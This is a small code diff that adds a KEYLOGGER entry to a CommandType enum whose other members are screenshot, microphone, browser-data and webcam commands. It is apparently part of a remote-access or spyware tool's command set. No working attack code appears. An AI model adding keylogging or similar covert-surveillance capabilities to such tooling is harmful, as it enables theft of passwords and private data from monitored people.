@@ -8,6 +8,7 @@ class CommandType(Enum):
     SCREENSHOT = "screenshot"
     MICROPHONE = "microphone"
     BROWSER_DATA = "browser_data"
+    KEYLOGGER = "keylogger"
     WEBCAM = "webcam"
 
 
